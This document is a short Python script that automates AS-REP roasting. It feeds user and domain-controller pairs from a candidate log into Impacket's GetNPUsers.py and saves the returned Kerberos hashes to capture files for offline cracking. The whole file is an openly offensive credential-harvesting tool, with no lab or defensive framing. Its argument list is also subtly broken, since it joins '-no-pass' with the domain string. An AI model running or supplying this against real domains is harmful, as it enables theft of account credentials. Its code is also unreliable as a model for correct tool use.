# asrep_extractor.py
import subprocess

def run_asrep_enum(domain, ip, user_list_file):
    print(f"[+] Running GetNPUsers on {ip}")
    out = f"captures/asrep_hashes_{ip}.txt"
    try:
        subprocess.run([
            "GetNPUsers.py",
            f"{domain}/ -no-pass",
            "-usersfile", user_list_file,
            "-dc-ip", ip
        ], stdout=open(out, "w"))
    except Exception as e:
        print(f"[-] ASREP Enum failed: {e}")

if __name__ == "__main__":
    with open("logs/asrep_candidates.txt") as f:
        for line in f:
            user_at_ip = line.strip()
            if '@' in user_at_ip:
                user, ip = user_at_ip.split('@')
                with open("tmp_users.txt", "w") as temp:
                    temp.write(user + "\n")
                run_asrep_enum("example.com", ip, "tmp_users.txt")
